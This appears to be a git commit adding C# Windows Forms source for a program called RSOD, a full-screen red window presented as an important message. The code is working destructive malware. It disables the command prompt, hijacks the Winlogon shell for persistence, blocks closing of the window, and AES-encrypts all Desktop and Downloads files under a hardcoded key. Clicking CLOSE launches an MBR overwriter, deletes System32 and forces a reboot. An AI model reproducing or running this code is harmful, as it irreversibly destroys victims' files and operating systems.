f81d3837ca8667aa1c8ba156efcfc239ce504a41
LegionCraft <65046578+LegionCraft-Network@users.noreply.github.com>
2022-02-13 15:22:01 +0100

    Add files via upload

---
+++ Source Code/RSOD/RSOD/Form1.Designer.cs
@@ -0,0 +1,92 @@
+﻿
+namespace RSOD
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variabile di progettazione necessaria.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Pulire le risorse in uso.
+        /// </summary>
+        /// <param name="disposing">ha valore true se le risorse gestite devono essere eliminate, false in caso contrario.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Codice generato da Progettazione Windows Form
+
+        /// <summary>
+        /// Metodo necessario per il supporto della finestra di progettazione. Non modificare
+        /// il contenuto del metodo con l'editor di codice.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft YaHei UI", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(12, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(706, 450);
+            this.label1.TabIndex = 0;
+            this.label1.Text = resources.GetString("label1.Text");
+            // 
+            // button1
+            // 
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Location = new System.Drawing.Point(540, 415);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(171, 44);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "CLOSE";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Red;
+            this.ClientSize = new System.Drawing.Size(723, 474);
+            this.ControlBox = false;
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label1);
+            this.ForeColor = System.Drawing.SystemColors.ControlLightLight;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "DomenicoBini.exe (Important Message)";
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ Source Code/RSOD/RSOD/Form1.cs
@@ -0,0 +1,252 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Windows.Forms;
+using System.Threading;
+
+namespace RSOD
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            //Anti Kill
+            e.Cancel = true;
+
+            try
+            {
+                Destroy();
+            }
+            catch(Exception ex)
+            {
+                //Skip
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            //Disable CMD
+            RegistryKey CMD_DIS = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
+            CMD_DIS.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+
+            //Edit Shell
+            RegistryKey Shell = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            Shell.SetValue("Shell", "explorer.exe, C:\\Windows\\res_winnt64\\MBR.exe, C:\\Windows\\res_winnt64\\RSOD.exe, C:\\Windows\\winnt64.exe", RegistryValueKind.String);
+            
+            //Define Paths
+            string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
+            string Downloads = Path.Combine(UserRoot, "Downloads");
+
+            //Delete All Hidden Files
+            string[] DesktopFiles = Directory.EnumerateFiles(Desktop + @"\").
+                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
+                ToArray();
+            string[] DownloadsFiles = Directory.EnumerateFiles(Downloads + @"\").
+                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
+                ToArray();
+            foreach (string file in DesktopFiles)
+                File.Delete(file);
+            foreach (string file in DownloadsFiles)
+                File.Delete(file);
+
+            //Delete Desktop.ini
+            string DesktopIni = (Desktop + @"\desktop.ini");
+            string DownloadsIni = (Downloads + @"\desktop.ini");
+            File.Delete(DesktopIni);
+            File.Delete(DownloadsIni);
+
+            //Encrypt Files
+            Start_Encrypt();
+        }
+
+        public class CoreEncryption
+        {
+            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+            {
+                byte[] encryptedBytes = null;
+                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (RijndaelManaged AES = new RijndaelManaged())
+                    {
+                        AES.KeySize = 256;
+                        AES.BlockSize = 128;
+
+                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                        AES.Key = key.GetBytes(AES.KeySize / 8);
+                        AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                        AES.Mode = CipherMode.CBC;
+
+                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                            cs.Close();
+                        }
+                        encryptedBytes = ms.ToArray();
+                    }
+                }
+
+                return encryptedBytes;
+            }
+        }
+
+        public class EncryptionFile
+        {
+            public void EncryptFile(string file, string password)
+            {
+
+                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+                string fileEncrypted = file;
+
+                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+            }
+        }
+
+        static void Start_Encrypt()
+        {
+            try
+            {
+                string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
+                string Downloads = Path.Combine(UserRoot, "Downloads");
+                string[] files1 = Directory.GetFiles(Desktop + @"\", "*", SearchOption.AllDirectories);
+                string[] files2 = Directory.GetFiles(Downloads + @"\", "*", SearchOption.AllDirectories);
+
+                EncryptionFile enc = new EncryptionFile();
+
+                string password = "*7ZZ@jWBG4M3Wl%N%7u6I%xgFPGybF#s&fg9xxBF#zTYigdu2q";
+
+                for (int i = 0; i < files1.Length; i++)
+                {
+                    enc.EncryptFile(files1[i], password);
+
+                }
+
+                for (int i = 0; i < files2.Length; i++)
+                {
+                    enc.EncryptFile(files2[i], password);
+
+                }
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            try
+            { 
+                Destroy();
+            } catch (Exception ex)
+            { 
+                //Skip
+            }
+        }
+
+        static void Destroy()
+        {
+            //OverWrite MBR
+            try
+            {
+                Process.Start("C:\\Windows\\res_winnt64\\MBR.exe");
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+            
+            //Delete Principal Files
+            try
+            {
+                File.Delete(@"C:\Windows\System32\*.*");
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+            try
+            {
+                File.Delete(@"C:\Windows\System32\*");
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+            try
+            {
+                Directory.Delete(@"C:\Windows\System32\");
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+            try
+            { 
+                Directory.Delete(@"C:\Windows\System32\", true);
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+
+            //Force File-Per-File
+            try
+            {
+                System.IO.DirectoryInfo di = new DirectoryInfo(@"C:\Windows\System32");
+                foreach (FileInfo file in di.GetFiles())
+                {
+                    file.Delete();
+                }
+                foreach (DirectoryInfo dir in di.GetDirectories())
+                {
+                    dir.Delete(true);
+                }
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+
+            //Delete Residues
+            try
+            {
+                string system32 = @"C:\Windows\System32";
+                string[] s32f = Directory.GetFiles(system32 + @"\", "*", SearchOption.AllDirectories);
+                foreach (string file in s32f)
+                    File.Delete(file);
+                Directory.Delete(system32);
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+
+            //Restart Computer
+            try
+            {
+                Thread.Sleep(5);
+                Process.Start("shutdown", "/r /f /t 0");
+            } catch (Exception ex)
+            {
+                //Skip
+            }
+        }
+    }
+}
